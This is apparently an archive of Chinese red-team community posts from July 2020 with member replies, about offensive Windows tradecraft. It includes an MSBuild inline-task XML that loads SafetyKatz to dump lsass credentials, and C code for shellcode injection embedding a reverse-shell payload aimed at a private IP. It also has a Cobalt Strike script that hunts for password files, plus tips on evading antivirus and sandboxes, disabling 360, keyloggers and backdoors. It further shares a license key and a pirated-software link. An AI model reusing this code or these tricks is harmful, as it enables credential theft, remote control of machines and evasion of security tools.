msbuild 一键dump+mimi<br>下班搞了两天总算弄出来了<br>整个思路还是使用msbuild的内联任务运行，但是之前写的那个safekatz代码不能直接用，而且还存在unsafe class，msbuild好像没有办法解决。不像csc可以直接/unsafe参数。<br><br>minidump()方法转储lsass进程<br>然后利用peloader 加载mimikatz执行解码。<br>类似过程可以看3好学生的文章。我是真没看到这篇文章[流泪]不然不至于卡这么久<br>[https://3gstudent.github.io/3gstudent.github.io/%E...](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E4%BB%8Elsass.exe%E8%BF%9B%E7%A8%8B%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE/)<br><br>制作的脚本：<br>[http://myblogimages.oss-cn-beijing.aliyuncs.com/so...](http://myblogimages.oss-cn-beijing.aliyuncs.com/soft/dump%2Bmimi.xml)<br><br>可以绕过360。<br><br>[http://myblogimages.oss-cn-beijing.aliyuncs.com/so...](http://myblogimages.oss-cn-beijing.aliyuncs.com/soft/dump%2Bmimi.xml)
![](https://images.zsxq.com/Fm4VrGNfv2RUdRUzzZssu8_5mDKN?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:rPf2-YgK87w6ZkeFQoTPcObbrbQ=)
```
Wing: 冲，过几天我上班了再复现下。
```
# RedTeaming - 2020-07-09
`#CSTips#`   `#免杀#`  <br>虽然现在有了Kit以后免杀很简单方便，但是之前的话就是改shellcode的生成过程，这个作者是自己重写一个工具，之前见过技巧是反编译得到Artifact.exe的源码，然后直接重新写一个免杀的Artifact生成payload即可。3.14版本和4.0版本生成方式发生了改变。<br><br>[从剖析CS木马生成到开发免杀工具](https://mp.weixin.qq.com/s/BUp3ignvFJhpm-unStrXig)

```
迪迦奥特曼: 星主有空出一些 免杀 kit 的修改技巧吧
Wing: 有人分享 kit 的话可以写一下。我自己的不是我本人的。
```
# RedTeaming - 2020-07-09
自定义URL Protocol协议+模拟点击拉起应用/执行命令<br>之前的存货，暂时还没想到有什么场景可以用到。就算是学习一趟吧<br><br><br><br><br><br><br><br><br>[自定义URL+Protocol协议+模拟点击拉起应用/执行命令+-+裤衩哥的小屋](http://www.8sec.cc/index.php/archives/363/)<br> `#内网渗透#` 

```
Wing: location 钓鱼
Wing: 找一些可信站点的 url 跳转
裤衩哥: [捂脸][捂脸] 模拟点击有点骚
```
# RedTeaming - 2020-07-09
`#FridaTips#`  <br>入门Frida的方法我觉得以刷CTF题的方式来学还是很好的，重点就是阅读源码能力和编写hook函数能力以及熟悉常见安卓反编译方法能力等，总之就是实践出真知。最近也在恶补JAVA核心基础，我自己想的是至少得把基础的东西搞懂，我也不知道自己喜欢研究什么。<br><br>[从三道题目入门frida](https://mp.weixin.qq.com/s/s88GxlRPpzSo7Uiwjt06eA)

```
Wing: 题目附件见原文[[原创]从三道题目入手入门frida-『Android安全』-看雪安全论坛](https://bbs.pediy.com/thread-260523.htm)
```
# RedTeaming - 2020-07-09
`#FridaTips#`  <br>入门Frida的方法我觉得以刷CTF题的方式来学还是很好的，重点就是阅读源码能力和编写hook函数能力以及熟悉常见安卓反编译方法能力等，总之就是实践出真知。最近也在恶补JAVA核心基础，我自己想的是至少得把基础的东西搞懂，我也不知道自己喜欢研究什么。<br><br>[从三道题目入门frida](https://mp.weixin.qq.com/s/s88GxlRPpzSo7Uiwjt06eA)

```
Wing: 题目附件见原文[[原创]从三道题目入手入门frida-『Android安全』-看雪安全论坛](https://bbs.pediy.com/thread-260523.htm)
```
# RedTeaming - 2020-07-09
沙箱检测补充-利用社会工程学通用过沙箱<br>[http://8sec.cc/index.php/archives/413/](http://8sec.cc/index.php/archives/413/)<br><br><br><br>​ 上一个项目中直接在对方的办公云桌面上，正好根据一些正常操作能够判断出虚拟机/云桌面 和沙箱的区别，整个原理在16年的一个word样本中就有使用，原理就是判断word历史打开文件数量，正常云桌面/个人PC都会打开一定数量的doc文件，而沙箱的环境只是安装了office套件却不会尝试打开doc文件，这个在后期测试过程中也发现了，微步会打开一个1.doc的文件。这里我们只要判断打开数量是否>=3即可。同理其实还有很多地方都可以用来判断是否是沙箱。<br>密码：<br>123xllfkvkvv<br>为什么要设置密码呢？有些东西一旦用的人多了就总会失效。<br> `#安全开发#` 
![](https://images.zsxq.com/FpxVkj5v7wPA9gAPVb02IHWWri_F?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:j_8D5w5ifEn1-2HATUOR4CX9Usw=)
![](https://images.zsxq.com/Frz9nZ643QmY7hB5ehBzbb4AxkTR?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:FBzYD14pDPn3IAcqgi-qk_x6acU=)
![](https://images.zsxq.com/FsYvMqb3tVG3si1RDbTtkDcmzQZ-?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:CPW2dHeedgdQVNcBWSMK9CkIKAo=)
![](https://images.zsxq.com/Fra6-h3CXBleJ3KkBkcyG_Vawl7F?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Sah0r8bRUV1WPNq5bPYAMwwIje4=)
```
裤衩哥: 晚上怎么没人 high 了呢 [撇嘴]
L: 目前我觉得可以的方法有三个：一个是判断是不是点击的，一个是给命令行参数要求输入对应的密码才能正确的执行配合混淆 api 的那种壳子，最后就是检测沙箱的操作
裤衩哥: 判断点击可以通过判断父进程来实现，加参数的话是个方法，我这里的应用场景更多是钓鱼。[机智][机智][机智][好的]
裤衩哥: 参数这个之前没有写，现已加入下次文章套餐列表 [奸笑]、一个题目我能水十多篇
crazyman: 遇到 anyrun 就吃瘪了
Wing: 昨晚喝高了…
裤衩哥: 刚刚传上去测了下，检测出来了
```
# RedTeaming - 2020-07-10
之前说的msbuild那个，目前静态过不去windows defender（代码中包含amsi bypass代码的缘故，可自行删除），加载的是safekatz可替换为高版本的mimikatz，适合内网中使用，做到无文件抓取、解密。<br><br>AMSI的使用的为：<br>[AmsiScanBufferBypass/ASBBypass.ps1+at+master+·+ras...](https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass.ps1)<br>(目前已失效，可忽略)<br><br>代码地址：<br>[http://note.youdao.com/s/FEs8X3Ub](http://note.youdao.com/s/FEs8X3Ub)
![](https://images.zsxq.com/FnGY7yAazx_IcRWaUm0WL2yfgZ01?e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:xnn3sBD4C0l41b9nr0WX3Kn4P94=)
```
lengyi: ps：08 未成功..
裤衩哥: 有道把链接拦截了，之前瞅了一下远程加载 bin，牛逼。。
lengyi: 不落地好玩
裤衩哥: 之前就没远程加载，头铁的直接把 pe 干进去了 [流泪]
lengyi: Peload 这个挺简单粗暴，就是 mimikatz 会在 xml 里面 [衰]
```
# RedTeaming - 2020-07-10
接上一条，链接被拦截了，我直接放代码..<br><br><Project ToolsVersion="4.0" xmlns="[http://schemas.microsoft.com/developer/msbuild/200...](http://schemas.microsoft.com/developer/msbuild/2003")><br>  <Target Name="Hello"><br>    <ClassExample/><br>  </Target><br>  <UsingTask<br>  TaskName="ClassExample"<br>  TaskFactory="CodeTaskFactory"<br>  AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" ><br>    <Task><br>      <Code Type="Class" Language="cs"><br>        <![CDATA[   <br>using System;<br>using System.IO;<br>using Microsoft.Build.Framework;<br>using Microsoft.Build.Utilities;<br>using System.Runtime.InteropServices;<br><br>class BaseLibs<br>{<br>    [DllImport("kernel32")]<br>    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);<br><br>    [DllImport("kernel32")]<br>    public static extern IntPtr LoadLibrary(string name);<br><br>    [DllImport("kernel32")]<br>    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflprotOld);<br>}<br><br>public class ClassExample : Task, ITask<br>{<br>    public override bool Execute()<br>    {    <br><br>        System.Reflection.Assembly.Load(File.ReadAllBytes(@"\\127.0.0.1\c$\SafetyKatz.bin")).EntryPoint.Invoke(0, new object[] { new string[] { } });<br>        return true;<br>    }<br>}<br> ]]><br>  </Code>   <br>    </Task><br>  </UsingTask><br></Project>

```
裤衩哥: 这种反射加载也不限于 c#[阴险][阴险]
lengyi: [捂脸][捂脸] 能配合 xml 我只会这个了。。
```
# RedTeaming - 2020-07-11
`#免杀#`  <br>猕猴桃🥝<br>1、删除OR替换源码内相关特征；注释、无用空行等。<br>2、upx压缩，删除PE里面带upx相关字段。<br>3、伪造签名。<br><br>[GitHub+-+wanglaizi/ByPass_MIMIkatz](https://github.com/wanglaizi/ByPass_MIMIkatz)

```
lengyi: 貌似在土司看到过
```
# RedTeaming - 2020-07-11
`#mimikatz免杀方法#` <br>方法0-原生态mimikatz.exe(VT查杀率55/71)<br>方法1-加壳+签名+资源替换(VT查杀率9/70)<br>方法2-Invoke-Mimikatz(VT查杀率39/58)<br>方法3-使用Out-EncryptedScript加密(VT查杀率0/60)<br>方法4-使用xencrypt加密(VT查杀率2/59)<br>方法5-PowerShell嵌入EXE文件(VT查杀率15/58)<br>方法6-C程序中执行powershell(VT查杀率7/71)<br>方法7-使用加载器pe_to_shellcode(VT查杀率47/70)<br>方法8-c#加载shellcode(VT查杀率21/57)<br>方法9-Donut执行mimikatz(VT查杀率29/71)<br>方法10-msf加载bin(VT查杀率2/59)<br>方法11-用C#加载mimikatz(VT查杀率35/73)<br>方法12-JS加载mimikatz(VT查杀率22/59)<br>方法13-msiexec加载mimikatz(VT查杀率25/60)<br>方法14-白名单msbuild.exe加载(VT查杀率4/59)<br>方法15-JScript的xsl版(VT查杀率7/60)<br>方法16-jscript的sct版(VT查杀率23/59)<br>方法17-ReflectivePEInjection加载(VT查杀率32/57)<br>方法18-导出lsass进程离线读密码(VT查杀率0/72)<br>防止mimikatz读取密码：<br>方法1-WDigest禁用缓存<br>方法2-Debug 权限方法3-LSA 保护<br>方法4-受限制的管理模式方法5-禁用凭证缓存方法6-受保护的用户组<br><br>原文地址：[Mimikatz的18种免杀姿势及防御策略+-+FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/234365.html)


# RedTeaming - 2020-07-12
 `#没有什么用的Tips#`  <br><br>cmd关闭win10自动更新.<br>虚拟机自己更新很烦.<br>sc stop wuauserv<br>sc config wuauserv start= disabled

```
青青河边草: 系统不更新不安全啊 [呲牙]
Wing: 虚拟机我要它安全干啥。里面各种马
青青河边草: 大佬牛逼 666 秒回啊
```
# RedTeaming - 2020-07-12
MSSQL_BackDoor<br><br>目的主要是摆脱MSSMS和 Navicat 调用执行 sp_cmdExec<br><br>使用脚本查询可以获取返回值, 之前只能获取消息, 所以很依赖工具执行 sp_cmdExec<br>更新 mimikatz_powershell 至2020版本<br>添加自定义 loader, 用于加载 cobaltstrike 和 metasploit 的 payload<br>添加 mimikatz_ssp 后门, 用于记录服务器的密码<br>sp_help, 一些提示指令<br><br>[GitHub+-+evi1ox/MSSQL_BackDoor](https://github.com/evi1ox/MSSQL_BackDoor)<br><br><br> `#Redteam#`    `#mssql #` tools #backdoor
![](https://images.zsxq.com/FqjEro_Nv7RjwEkK45Hem51ELj2t?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:I87KuCcsstOrf7wH_cvGQAjjLBI=)
![](https://images.zsxq.com/Fhc0vv1PbrHT7L_ypyw18LXS1VSc?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:cWIRR5sIoR-EuB85vQCFPZFF3qk=)
![](https://images.zsxq.com/FvheQFSxOB2QhgEYljfLE1C6nojq?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:6_zO1duaTOuPtIrVylF5sZQli1E=)
![](https://images.zsxq.com/FqNvXzHBdZ4YHyIxndyWeRwQgXFK?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:-xzFs9M0BCT-j1jripuoxCKEAUA=)
```
Wing: @evi1ox
Evi1oX: 处女贴被抢了，下次再捣鼓个更好的 [微笑]
迪迦奥特曼: mssql: 找不到存储过程'sp_cmdExec'。 Try xp_cmdshell to Run Command !<br><br>'sp_downloadFile' 不是内部或外部命令，也不是可运行的程序 <br><br><br> 这个是需要哪些操作，是不是我少了一些步骤。
```
# RedTeaming - 2020-07-12
[https://krober.biz/misc/reverse_shell.php?nsukey=Y...](https://krober.biz/misc/reverse_shell.php?nsukey=YEhbwW0Kf41RHvSNUXHFW34YzRmDz88%2FePiGn7WofWgba0LKueLnvGmcS3okXYaWgdBsyr95zmwR0YNEBjPXlosVqIDUQHx8y76jiXxRC7S7Y3wXVG5miwwcGPOfFaff2rUFiXL5engLPj6B%2BH7%2BMTZeSG3uFX%2FoLh3uA4eyJT6Qn3rrqH%2BwPjSYqE51mteE7QK5BdxG3oKwALk22tIfhQ%3D%3D)

```
Evi1oX: 来个离线版: [GitHub+-+evi1ox/shell_command](https://github.com/evi1ox/shell_command)
lengyi: 酷
```
# RedTeaming - 2020-07-12
`#渗透技巧#`  <br>渗透测试红线List，都很实用，可以commit<br><br>[GitHub+-+EvilAnne/Violation_Pnetest:+渗透红线Checklist](https://github.com/EvilAnne/Violation_Pnetest)
![](https://images.zsxq.com/FjpobS8IpvN62HQTDhMLVOzQhHxH?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:rAxPpHu7IqzX1epnBfViNg9E30g=)

# RedTeaming - 2020-07-14
`#MacTips#` <br>你们应该都没升级pd,升级的话会发现很多破解软件无法使用,Bug Sir名不虚传,特别是VM所有的虚拟机文件无法打开,只能等官方更新,还好PD可以用,但是破解版基本都不行了.今天在B站凑巧看到一个可用的.<br>链接:[https://pan.baidu.com/s/1P8qR_RgJF7FDMw2SfTsgww](https://pan.baidu.com/s/1P8qR_RgJF7FDMw2SfTsgww)  密码:v9dv<br>记得断网安装.
![](https://images.zsxq.com/Fj3pFQa4j3RN3G21CCObmfdDMd-I?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:HegpP8YgnXapfPZStCiv7DMr334=)
```
裤衩哥: 之前升级 15 的时候 vm 就突然用不了了，虚拟机都是黑屏，还不申请屏幕权限，还记得那时正在六月的北京
Wing: 以后不可能再瞎鸡儿乱搞了。
裤衩哥: 我是吃过亏了😂
Black cher*: win 用户就不用担心这些 [坏笑]
lengyi: 然而我没有 mac [捂脸]
```
# RedTeaming - 2020-07-15
`#CS插件开发#`   `#红队武器化研发#`   `#免杀#`  <br>自动免杀到PE文件感染的权限维持<br>看附件.<br>shellcode不会写,谁来带带?

```
迪迦奥特曼: 师傅这个准备啥时候放出来，哈哈
Wing: 护网结束。[捂脸]
Wing: 公司内部用。
迪迦奥特曼: 嗯嗯好的，坐等 哈哈
```
# RedTeaming - 2020-07-15
 `#权限维持#`  <br>利用AMSI进行权限维持,可算是编译好,修好Bug了.<br>看附件的小文章~~~

```
L: 编译到自闭。。
Wing: [奸笑][奸笑][奸笑][奸笑][奸笑][奸笑]
```
# RedTeaming - 2020-07-15
`#红队技巧#`  <br>[https://ired.team/](https://ired.team/)是一本葵花宝典,练了注定秃头~~~<br><br><br><br>利用CreateThreadpoolWait进行进程注入<br><br>[https://ired.team/offensive-security/code-injectio...](https://ired.team/offensive-security/code-injection-process-injection/shellcode-execution-via-createthreadpoolwait)<br><br><br>Code:<br><br>#include <windows.h><br>#include <threadpoolapiset.h><br><br>unsigned char shellcode[] = <br>"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"<br>"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"<br>"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"<br>"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"<br>"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"<br>"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"<br>"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"<br>"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"<br>"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"<br>"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"<br>"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"<br>"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"<br>"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"<br>"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"<br>"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"<br>"\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x38\x66\x41\x54"<br>"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"<br>"\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"<br>"\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"<br>"\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"<br>"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"<br>"\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"<br>"\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"<br>"\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"<br>"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"<br>"\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"<br>"\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"<br>"\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"<br>"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"<br>"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"<br>"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";<br><br><br>int main()<br>{<br>	HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);<br>	LPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>	RtlMoveMemory(shellcodeAddress, shellcode, sizeof(shellcode));<br><br>	PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcodeAddress, NULL, NULL);<br>	SetThreadpoolWait(threadPoolWait, event, NULL);<br>	WaitForSingleObject(event, INFINITE);<br>	<br>	return 0;<br>}
![](https://images.zsxq.com/Fn2IsKGaI8hsNDbn7zhV5zXFSqQS?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:SuN3YsnotE7IJ4a74z1F9j--4lw=)
![](https://images.zsxq.com/Fs9bT6EYYZOOZYYKcAKX6DdDkgQa?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:jE8kTVNTvm9mkNSTUn11N8Cr_Lg=)

# RedTeaming - 2020-07-16
不知道有没有用，先放这里了[调皮]<br><br>[使用CVE-2020-0601进行伪造签名](https://mp.weixin.qq.com/s/wca5osB5R16bWvtx2LnPPg)


# RedTeaming - 2020-07-17
`#红队技巧#`  <br>可以有效提高内网渗透的效率，定位多网卡主机。<br>[GitHub+-+Rvn0xsy/OXID-Find:+Find+the+host+network+...](https://github.com/Rvn0xsy/OXID-Find)
![](https://images.zsxq.com/FldCGOwTPx3CP0_h0DbHcxrEQM_F?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:M95UQ6JRya0QptwF02IJBAOOnUw=)

# RedTeaming - 2020-07-18
`#FridaTips#`   `#那些年我们没有错过的Bug#` <br>TNND，Brida新版本多了好些功能，想测试下，结果一直错。<br><br>我的解决办法：<br>py2虚拟环境+ sudo launchctl config user path /usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin 然后重启即可。大半夜的，不让人好好睡觉。
![](https://images.zsxq.com/FpHzfA_a7oSMhAVh1YEkeic8qjdS?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:FKWyVATQcgc_85L4fE0wJbv7Gpg=)

# RedTeaming - 2020-07-18
 `#碎碎念#`  <br>晚点我写一下Brida插件开发的技巧，建议大家去看Wiki，简单明了。这一下子开始上班以后没时间做其他的，安卓测试还是很重要的。

```
裤衩哥: 不看，学不会，我选择白嫖 [社会社会]
迪迦奥特曼: 大佬，你博客的 sandbox 检测 - 常见分析平台特征 这篇的密码可以提供下吗，想学习下。
裤衩哥: 这星球里之前的帖子有密码
迪迦奥特曼: 找到的几个都不对，哈哈 ，大佬空了的话发一下
裤衩哥: 哦哦，那个忘记了，那个有自己家设备不能放 [捂脸]，不然会被找
迪迦奥特曼: 嗯嗯 好的，谢谢师傅
```
# RedTeaming - 2020-07-18
`#工具技巧#`  <br>Proxifier通用注册码<br>4.0.1 (2020.7.7)<br>3.4.2 (2018.8.31)<br>3.3.1 (2016不推荐)<br>5EZ8G-C3WL5-B56YG-SCXM9-6QZAP（Standard Edition）<br>[http://www.proxifier.com/download/#win-tab](http://www.proxifier.com/download/#win-tab)<br><br>来自：[〖教程〗Ladon+Socks代理扫描(附Proxifier4.0注册码)+|+K8哥哥’s+Blo...](http://k8gege.org/Ladon/proxy.html)<br><br>Windows的，mac的在[Proxifier+2.26+fixed+破解版+for+Mac+Mac系统全局代理客户端](https://www.macwk.com/soft/proxifier)

```
RBPi: 代理好工具
Evi1oX: 好像新版只支持 win
Wing: 管他的，Mac 都是命令行。
Black cher*: 汉化新世纪有破的，，不知道有没有 mac
Wing: 有的。网上 mac 的网站都有。
Wing: 我发了啊。链接
Black cher*: [嘿哈] 软件有了，mac 哪里领
```
# RedTeaming - 2020-07-19
`#BugBounty#`  <br>挖洞自动化框架<br><br>子域名<br>爬虫<br>截图<br>资产信息<br>以及推特情报订阅<br><br>59美元一个月，太贵了，建议自己写。<br><br>[Bug+Bounty+Automation+Framework+-+Ghostlulz+Hacks](http://ghostlulz.com/bug-bounty-automation-framework/)


# RedTeaming - 2020-07-19
`#BugBounty#`  <br>挖洞自动化框架<br><br>子域名<br>爬虫<br>截图<br>资产信息<br>以及推特情报订阅<br><br>59美元一个月，太贵了，建议自己写。<br><br>[Bug+Bounty+Automation+Framework+-+Ghostlulz+Hacks](http://ghostlulz.com/bug-bounty-automation-framework/)


# RedTeaming - 2020-07-19
`#红队技巧#` <br>内网获取目标主机上的网卡信息,C++和Csharp版本<br>[OXID_Find：通过OXID解析器获取Windows远程主机上网卡地址+·+Uknow+-+St...](https://uknowsec.cn/posts/notes/OXID_Find%EF%BC%9A%E9%80%9A%E8%BF%87OXID%E8%A7%A3%E6%9E%90%E5%99%A8%E8%8E%B7%E5%8F%96Windows%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BD%91%E5%8D%A1%E5%9C%B0%E5%9D%80.html)

```
裤衩哥: [机智] 现在网络真智能，我还没写完呢别人都用上了 [机智]
Wing: 太惨了😂
lengyi: 所以，你选择白嫖是正确的 [坏笑]
```
# RedTeaming - 2020-07-19
`#工具技巧#`  <br>HackBar V2<br><br>[No License, FOREVER FREE] A HackBar for new firefox (Firefox Quantum). This addon is written in webextension and alternatives to the XUL version of original Hackbar.<br>[HackBar+V2+–+下载+🦊+Firefox+扩展（zh-CN）](https://addons.mozilla.org/zh-CN/firefox/addon/hackbar-free/?src=search)
![](https://images.zsxq.com/FhssZhNBMhJcyMZFij2QR1_kamN6?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:CXqQ-VWqv-YpHetYxIti4g6se_E=)

# RedTeaming - 2020-07-19
提权的<br><br>[GitHub+-+Q4n/CVE-2020-1362:+writeup+of+CVE-2020-13...](https://github.com/Q4n/CVE-2020-1362)


# RedTeaming - 2020-07-20
按键精灵方式关闭360<br>折腾一会以后发现有点困难[捂脸]<br><br><br>[分享一种可关闭大多数杀软的技术（对360安全卫士已验证成功） | MS509 Team](https://www.ms509.com/2017/06/06/bypass360-analysis)

```
Black cher*: 默认开启核晶防护，这种方法行不通。pass
lengyi: Py 有个库，实现起来挺简单。师傅可以试试
Black cher*: 师傅求指教，是哪个库呀。
L: 一般只有个人主机那种有用吧 [嘿哈]
Black cher*: 是的，就是要突破 [捂脸]
L: 低权没法切换到某个用户的桌面吧
```
# RedTeaming - 2020-07-20
## Question:
表哥，键盘记录有没有好用一点的，cs 在复杂环境下好不稳定。头疼死了

## Answer:
c 系列的很多啊。go 写的太大了。刚到家，待会搜搜看。

```
Wing: [GitHub+-+aydinnyunus/Keylogger:+Get+Keyboard,Mouse...](https://github.com/aydinnyunus/Keylogger)
Black cher*: [捂脸] 免杀失败
Wing: 用 win api 自己写一个最好，没特征。
```
# RedTeaming - 2020-07-20
`#C2#`  <br>C++<br>Java<br>Go<br><br>[GitHub+-+jafarlihi/serpentine:+Windows+RAT+(Remote...](https://github.com/jafarlihi/serpentine)


# RedTeaming - 2020-07-21
`#CSTips#`   `#CS插件开发#`  <br>最近要忙项目，没时间看东西，今天看到一个sharpsearch。<br>搜索敏感文件<br>顺手写下分享。<br><br><br><br>menu "敏感字段收集"{<br>	item "SharpSearch"{<br>		local('$bid');<br>		foreach $bid ($1){<br>			&sharpsearch($bid);<br>		}<br>	}<br>}<br># ####Wing SubFunc<br>sub sharpsearch{<br>	# 定义变量<br>	local('$dialog %defaults $bid');<br>	$bid = $1;<br>	<br>	%defaults["path"] = "C:\\";<br>	%defaults["blacklist"] = "rar,zip,exe,tar";<br>	%defaults["string"] = "password";<br><br><br>	$dialog = dialog("敏感字符搜索", %defaults, lambda({<br>		bexecute_assembly($bid,script_resource("/exe/SharpSearch.exe"),"path=$3['path'] ext_blacklist=$3['blacklist'] searchterms=$3['string'] ");<br>	}));<br>	dialog_description($dialog, "Wing");<br>	drow_text($dialog, "path", "路径: ");<br>	drow_text($dialog, "blacklist", "黑名单: ");<br>	drow_text($dialog, "string", "string: ");<br>	dbutton_action($dialog, "Execute");<br>	# dbutton_action($dialog, "Help");<br>	dialog_show($dialog);<br>}
![](https://images.zsxq.com/FtY4wk2Rjw9p6N2TPIXPcoYj-6WO?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:p8KqA5vo_faE5BEEzxCX7AhaFYc=)
![](https://images.zsxq.com/Fv8wSzyUJIfyHCKvBEjaQmoUxN6q?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:7J833c5mty8xPMcBBmQneYDugSo=)
![](https://images.zsxq.com/FtlZMgHbfNFUsFX9bxJe__YIXYUP?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:XvZ5oBcD6r1ZqkODq4elyNxQzjU=)

# RedTeaming - 2020-07-22
`#免杀#`   `#红队技巧#`  <br>绕过AMSI拦截以及防止powershell历史命令被记录。
